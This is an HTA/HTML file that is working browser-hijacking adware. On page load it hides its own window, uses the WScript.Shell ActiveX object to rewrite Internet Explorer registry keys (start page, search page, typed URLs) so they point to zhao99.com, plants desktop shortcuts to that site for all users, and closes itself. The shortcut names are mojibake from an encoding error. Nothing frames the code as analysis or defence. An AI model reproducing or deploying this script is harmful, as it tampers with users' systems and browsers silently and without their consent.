   <html>
   <hta:application caption="no" showintaskbar="no">
   <body onload="window.blur();">
   <object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
   <script LANGUAGE="VBScript">
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.zhao99.com"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.zhao99.com"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "http://www.zhao99.comserch.htm"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "http://www.zhao99.com"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","http://www.zhao99.com"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","http://www.zhao99.com"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","http://www.zhao99.com"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","http://www.zhao99.com"
   window.close
   </script>
   <script language=VBScript>
   on error resume next
   Call Bugs_AddDesktop("zhao99Ãâ·ÑµçÓ°","http://www.zhao99.com")
   Call Bugs_AddDesktop("Ãâ·ÑÔÚÏßÒôÀÖÊÓÌý","http://music.zhao99.com/music/index.jsp")


   Function Bugs_AddDesktop(N, U)
       on error resume next
       Set S = bugs.CreateShortcut(bugs.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
   End Function
   </script>
   <script language="javascript">
   window.close();
   </script>
   </body>
   </html>
